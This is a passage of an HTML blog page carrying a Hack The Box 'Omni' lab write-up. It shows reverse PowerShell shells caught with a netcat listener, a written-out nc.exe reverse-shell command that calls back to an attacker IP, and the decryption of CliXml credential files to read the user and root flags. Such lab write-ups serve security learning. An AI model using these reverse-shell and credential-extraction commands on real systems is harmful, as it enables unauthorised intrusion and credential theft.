+    listening on [any] 1235 ....
+    connect to [10.10....] from (UNKNOWN) [10.10.10.204] 49700
+    Windows PowerShell
+    Copyright (C) Microsoft Corporation. All rights reserved.
+    PS C:\windows\system32> 
+                                                        </code></pre>
+                                                        </div>
+                                                
+                                                        <li>Again using this <code class="language-plaintext highlighter-rouge"> $env:UserName</code> To Find Which User Shell We Got</li>
+                                                
+                                                        <div class="language-bash highlighter-rouge">
+                                                            <pre><code style="color: white;">
+    root@DEDSEC:~# nc -nvlp 1235
+    listening on [any] 1235 ....
+    connect to [10.10....] from (UNKNOWN) [10.10.10.204] 49700
+    Windows PowerShell
+    Copyright (C) Microsoft Corporation. All rights reserved.
+    PS C:\windows\system32> $env:UserName
+    $env:UserName
+    app$
+    PS C:\windows\system32>
+                                                        </code></pre>
+                                                        </div>
+                                                
+                                                        <li>we are <code class="language-plaintext highlighter-rouge">App</code></li>
+                                                        <li>We can now read <code class="language-plaintext highlighter-rouge">user.txt</code> but the contents inside looks to be <code class="language-plaintext highlighter-rouge">encrypted</code>.</li>
+                                                        <li>Now we do the decryption process of PS credential by importing the <code class="language-plaintext highlighter-rouge">CliXml module</code>.</li>
+                                                        <div class="language-bash highlighter-rouge">
+                                                            <pre><code style="color: white;">
+    PS C:\windows\system32> $credential = Import-CliXml -Path U:\Users\app\user.txt
+    $credential = Import-CliXml -Path U:\Users\app\user.txt
+    PS C:\windows\system32> $credential.GetNetworkCredential().Password
+    $credential.GetNetworkCredential().Password
+    7cfd50f6bc34db3204898f1505ad9d70
+                                                        </code></pre>
+                                                        </div>
+                                                        <h4>We got the <code class="language-plaintext highlighter-rouge">user</code> flag. </h4>
+                                                
+                                                        <li>Remember we found two usernames in r.bat file? Let's use the second one, the Administrator.</li>
+                                                        <li>Close Firefox and start it again. </li>
+                                                        <li>Login via: <code class="language-plaintext highlighter-rouge">administrator</code></li>
+                                                        <li>Start another Netcat listener. </li>
+                                                        <li>Go to Processes > <code class="language-plaintext highlighter-rouge">Run Command</code></li>
+                                                        <li>Run this <code class="language-plaintext highlighter-rouge">Command</code> </li>
+                                                        
+                                                
+                                                        <div class="language-bash highlighter-rouge">
+                                                            <pre><code style="color: white;">
+    C:\Windows\System32\spool\drivers\color\nc.exe 10.10..... 1234 -e powershell.exe
+                                                        </code></pre>
+                                                        </div>
+                                                
+                                                        <li>We get a reverse <code class="language-plaintext highlighter-rouge">shell</code>.</li>
+                                                        <li>Now lets decrypt the <code class="language-plaintext highlighter-rouge">root.txt</code> file</li>
+                                                
+                                                        <div class="language-bash highlighter-rouge">
+                                                            <pre><code style="color: white;">
+    root@DEDSEC:~# nc -nvlp 1234
+    listening on [any] 1234 ....
+    connect to [10.10....] from (UNKNOWN) [10.10.10.204] 49701
+    Windows PowerShell
+    Copyright (C) Microsoft Corporation. All rights reserved.
+    PS C:\windows\system32> $env:UserName
+    $env:UserName
+    Administrator$
+    PS C:\windows\system32> $credential = Import-CliXml -Path U:\Users\administrator\root.txt
+    $credential = Import-CliXml -Path U:\Users\administrator\root.txt
+    PS C:\windows\system32> $credential.GetNetworkCredential().Password
+    $credential.GetNetworkCredential().Password
+    5dbdce5569e2c4708617c0ce6e9bf11d
+    PS C:\windows\system32> 
+                                                        </code></pre>
+                                                        </div>
+                                                
+                                                        <h3>We got the Root hash. </h3>
+                                    <p>And we pwned it …….</p>
+                                    <p>
+                                        If u liked the writeup.Support a Student to Get the <code class="language-plaintext highlighter-rouge">OSCP-Cert</code>
+                                        <a href="https://0xdedinfosec.github.io/tabs/donation/" target="_blank">Donation for OSCP</a>
+                                    </p>
+                                    <h1 id="resources">Resources</h1>
+                                <table>
+                                    <thead>
+                                        <tr>
+                                            <th>Topic
+                                            <th>
+                                                Url
+                                                <tbody><tr><td>SirepRAT</td><td><a href="https://github.com/SafeBreach-Labs/SirepRAT" target="_blank">https://github.com/SafeBreach-Labs/SirepRAT</a></td></tr><tr><td>pentest-monkey shell</td><td><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank">http://pentestmonkey.net/tools/web-shells/php-reverse-shell</a></td></tr><tr><td>Netcat Binary</td><td><a href="https://eternallybored.org/misc/netcat/" target="_blank">https://eternallybored.org/misc/netcat/</a></td></tr>
+                                                </table>
+                    </div>
+                    <div class="post-tail-wrapper text-muted">
+                        <div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2">
+                            <div class="license-wrapper">
+                                <span class="license-text ml-1 mr-1">
+                                    This post is licensed under 
+                                    <a href="https://creativecommons.org/licenses/by/4.0/">
+                                        CC BY 4.0 <i class="fab fa-creative-commons"></i>
+                                        <i class="fab fa-creative-commons-by"></i>
+                                    </a>
+                                </span>
+                            </div>
+                            <!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License -->
+                            <div class="share-wrapper">
+                                <span class="share-label ml-1 mr-1">Share</span>
+                                <span class="share-icon">
+                                    <a href="#" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank">
+                                        <i class="fa-fw fab fa-twitter mr-1"></i>
+                                    </a>
+                                    <a href="https://www.facebook.com/dedsecinfoServices/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank">
+                                        <i class="fa-fw fab fa-facebook-square mr-1"></i>
+                                    </a>
+                                    <a href="#" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank">
+                                        <i class="fa-fw fab fa-telegram mr-1"></i>
+                                    </a>
+                                    <i class="fa-fw fas fa-link mr-1 small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i>
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div id="panel-wrapper" class="col-xl-3 pl-2 topbar-down">
+                <div class="access">
+                    <div id="access-lastmod" class="post mb-4">
+                        <h3 data-toc-skip>Recent Update</h3>
+                        <ul class="post-content pl-0 pb-1 ml-1 mt-2">
+                            <li>
+                                <a href="/posts/htb-time/">Hackthebox Time writeup</a>
+                            </li>
+                            <li>
+                                <a href="/posts/htb-jewel/">Hackthebox Jewel writeup</a>
+                            </li>
+                            <li>
+                                <a href="/posts/htb-reel2/">Hackthebox Reel2 writeup</a>
+                            </li>
+                            <li>
+                                <a href="/posts/htb-doctor/">Hackthebox Doctor writeup</a>
+                            </li>
+                            <li>
+                                <a href="/posts/htb-compromised/">Hackthebox Compromised writeup</a>
+                            </li>
+                        </ul>
+                    </div>
+                    <div id="access-tags">
+                        <h3 data-toc-skip>Trending Tags</h3>
+                        <div class="d-flex flex-wrap mt-3 mb-1 mr-3">
+                            <a class="post-tag" href="/tags/cve/">CVE</a>
+                            <a class="post-tag" href="/tags/linpeas/">LinPEAS</a>
+                            <a class="post-tag" href="/tags/mysql-backdoor/">MySQL Backdoor</a>
+                            <a class="post-tag" href="/tags/server-side-template-injection/">Server-Side Template Injection</a>
+                            <a class="post-tag" href="/tags/ftp/">FTP</a>
+                            <a class="post-tag" href="/tags/sireprat/">SirepRAT</a>
+                            <a class="post-tag" href="/tags/jackson/">Jackson</a>
+                            <a class="post-tag" href="/tags/gtfobins/">GTFO-Bins</a>
+                            <a class="post-tag" href="/tags/pypi-server/">pypi-server</a>
+                            <a class="post-tag" href="/tags/email-extractor/">email-extractor</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="row">
+            <div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8">
+                <div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
+                    <div class="post-navigation d-flex justify-content-between">
+                        <a href="/posts/htb-jewel/" class="btn btn-outline-primary">
+                            <p>Hackthebox Jewel writeup</p>
+                        </a>
+                        <a href="/posts/htb-reel2/" class="btn btn-outline-primary">
+                            <p>Fortress Reel2 writeup</p>
+                        </a>
+                    </div>
+                    <!-- Disqus  -->
+                    <script id="dsq-count-scr" src="//0xdedinfosec.disqus.com/count.js" async></script>
+                    <div id="disqus_thread"></div>
+                    <script>
+                    var disqus_config = function () {
+                    this.page.url = 'https://0xdedinfosec.github.io/posts/htb-omni/';  
+                    this.page.identifier = '/posts/htb-omni/';
+                    };
+                    (function() {
+                    var d = document, s = d.createElement('script');
+                    s.src = 'https://0xdedinfosec.disqus.com/embed.js';
+                    s.setAttribute('data-timestamp', +new Date());
+                    (d.head || d.body).appendChild(s);
+                    })();
+                    </script>
+                    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                            
+                    <!-- Disqus end -->
+                    <div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2">
+                        <h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3>
+                        <div class="card-deck mb-4">
+                            <div class="card">
+                                <a href="/posts/htb-jewel/">
+                                    <div class="card-body">
+                                        <span class="timeago small">
+                                            Oct 29, 2020 <i class="unloaded">2020-10-29T00:00:00+00:00</i>
+                                        </span>
+                                        <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Jewel writeup</h3>
+                                        <div class="text-muted small">
+                                            <p>information Column Details Name Jewel IP 10.10.10.211 Points 30 Os Linux ...</p>
+                                        </div>
+                                    </div>
+                                </a>
+                            </div>
+                            <div class="card">
+                                <a href="/posts/hackthebox-reel2/">
+                                    <div class="card-body">
+                                        <span class="timeago small">
+                                            Oct 05, 2020 <i class="unloaded">2020-10-05T00:00:00+00:00</i>
+                                        </span>
+                                        <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Reel2 writeup</h3>
+                                        <div class="text-muted small">
+                                            <p>information@Sauna:~$ Column Details Name Reel2 IP 10.10.10.210 Points 40 Os Windo...</p>
+                                        </div>
+                                    </div>
+                                </a>
+                            </div>
+                            <div class="card">
+                                <a href="/posts/htb-doctor/">
+                                    <div class="card-body">
+                                        <span class="timeago small">
+                                            Sep 28, 2020 <i class="unloaded">2020-09-28T00:00:00+00:00</i>
+                                        </span>
+                                        <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Doctor writeup</h3>
+                                        <div class="text-muted small">
+                                            <p>Information@openadmin:~$ Column Details Name Doctor IP 10.10.10.209 Points 20 Os ...</p>
+                                        </div>
+                                    </div>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script>
+        <script type="text/javascript">
+            const observer = lozad();
+            observer.observe();
+        </script>
+        <footer class="d-flex w-100 justify-content-center">
+            <div class="d-flex justify-content-between align-items-center">
+                <div class="footer-left">
+</p></div>
+<p class="mb-0">
+    © 2020 <a href="https://www.facebook.com/dedsecinfoServices/">Dedinfosec</a>
+    . <span data-toggle="tooltip" data-placement="top" title="The blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License.">All rights reserved.</span>
+    <script>
+        (function(i, s, o, g, r, a, m) {
+            i['GoogleAnalyticsObject'] = r;
+            i[r] = i[r] || function() {
+                (i[r].q = i[r].q || []).push(arguments)
+            }
+            ,
+            i[r].l = 1 * new Date();
+            a = s.createElement(o),
+            m = s.getElementsByTagName(o)[0];
+            a.async = 1;
+            a.src = g;
+            m.parentNode.insertBefore(a, m)
+        }
+        )(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+        ga('create', 'UA-157514490-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+</footer></div>
+<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
+    <div class="col-12 col-xl-11 post-content">
+        <div id="search-hints">
+            <h4 class="text-muted">Trending Tags</h4>
+            <a class="post-tag" href="/tags/cve/">CVE</a>
+            <a class="post-tag" href="/tags/linpeas/">LinPEAS</a>
+            <a class="post-tag" href="/tags/mysql-backdoor/">MySQL Backdoor</a>
+            <a class="post-tag" href="/tags/server-side-template-injection/">Server-Side Template Injection</a>
+            <a class="post-tag" href="/tags/ftp/">FTP</a>
+            <a class="post-tag" href="/tags/sireprat/">SirepRAT</a>
+            <a class="post-tag" href="/tags/jackson/">Jackson</a>
+            <a class="post-tag" href="/tags/gtfobins/">GTFO-Bins</a>
+            <a class="post-tag" href="/tags/pypi-server/">pypi-server</a>
+            <a class="post-tag" href="/tags/email-extractor/">email-extractor</a>
+        </div>
+        <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
+    </div>
+</div>
+</div><div id="mask"></div>
+<a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button">
+    <i class="fas fa-angle-up"></i>
+</a>
+<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script>
+<script>
+    SimpleJekyllSearch({
+        searchInput: document.getElementById('search-input'),
+        resultsContainer: document.getElementById('search-results'),
+        json: '/assets/data/search.json',
+        searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://0xdedinfosec.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>',
+        noResultsText: '<p class="mt-5">Oops! No result founds.</p>'
+    });
+</script>
